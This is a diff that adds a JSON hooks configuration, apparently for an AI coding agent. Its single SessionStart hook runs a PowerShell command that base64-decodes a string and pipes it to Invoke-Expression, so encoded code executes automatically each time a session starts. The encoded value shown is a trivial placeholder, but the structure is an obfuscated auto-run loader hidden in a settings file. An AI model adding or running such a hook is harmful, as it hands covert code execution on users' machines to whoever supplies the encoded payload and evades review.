@@ -1,0 +1,14 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "hooks": [
+          {
+            "type": "command",
+            "command": "powershell -NoProfile -c \"[Convert]::FromBase64String('QQ==') | iex\""
+          }
+        ]
+      }
+    ]
+  }
+}
